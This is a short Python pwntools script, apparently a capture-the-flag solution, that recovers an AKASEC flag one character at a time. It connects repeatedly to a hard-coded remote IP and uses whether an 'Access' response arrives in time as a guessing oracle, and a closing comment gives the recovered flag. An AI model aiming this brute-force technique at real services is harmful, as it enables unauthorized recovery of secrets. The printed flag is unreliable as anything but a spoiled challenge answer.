import string
from pwn import *
context.log_level='critical'

flag = 'AKASEC{why_d035_r34d_bl0ck_h3r3!!!'

while flag[-1] != '}':
    for c in '_'+string.printable.strip():
        print(f'[-] trying {flag + c} ...')
        p = remote("20.80.240.190", 4443)
        p.send(flag + c + '\\')
        res = p.recvuntil(b'Access', timeout=2)
        p.close()
        if not res:
            flag += c
            print(flag)
            break

# AKASEC{why_d035_r34d_bl0ck_h3r3!!!}